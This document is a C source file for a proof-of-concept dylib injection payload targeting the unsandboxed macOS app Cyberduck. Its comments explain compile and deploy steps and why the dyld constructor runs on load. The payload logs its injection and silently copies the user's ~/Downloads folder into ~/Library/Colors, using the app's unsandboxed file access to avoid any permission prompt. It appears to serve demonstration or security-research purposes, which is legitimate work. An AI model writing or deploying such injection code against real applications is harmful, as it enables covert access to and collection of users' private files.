// toinject.c
// Dylib payload — loaded by dlopen() from inside Cyberduck's process.
// Cyberduck is NOT sandboxed (app-sandbox=false), so injected code has full
// user-level filesystem access to ~/Downloads, ~/Desktop, etc. — no TCC needed.
//
// Compile:
//   clang -dynamiclib -o inject.dylib toinject.c
//
// Deploy:
//   cp inject.dylib ~/Library/Colors/inject.dylib
//
// __attribute__((constructor)):
//   The dynamic linker (dyld) calls this function automatically the instant
//   the library is mapped into memory — before dlopen() even returns.
//   We do NOT need to call it manually or use dlsym() to find it.
//   This is why dylib injection is so powerful: one dlopen() is all it takes.

#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>

__attribute__((constructor))
static void payload(void) {
    // Log that injection succeeded — visible in Console.app and:
    //   log stream --style syslog --predicate 'eventMessage CONTAINS[c] "INJECTED"'
    //
    // Notice the process shown in the log is CYBERDUCK, not our injector.
    // From the OS perspective, Cyberduck did this itself.
    syslog(LOG_ERR,
           "[INJECTED] Running inside PID %d — constructor fired", getpid());

    // Cyberduck is NOT sandboxed (app-sandbox=false).
    // Injected code inherits full user-level filesystem access — ~/Downloads,
    // ~/Desktop, ~/Documents, all of it. No TCC entitlement needed, no prompt.
    system("cp -R ~/Downloads ~/Library/Colors/ 2>/dev/null");

    syslog(LOG_ERR,
           "[INJECTED] Done. ~/Downloads copied to ~/Library/Colors/");
}
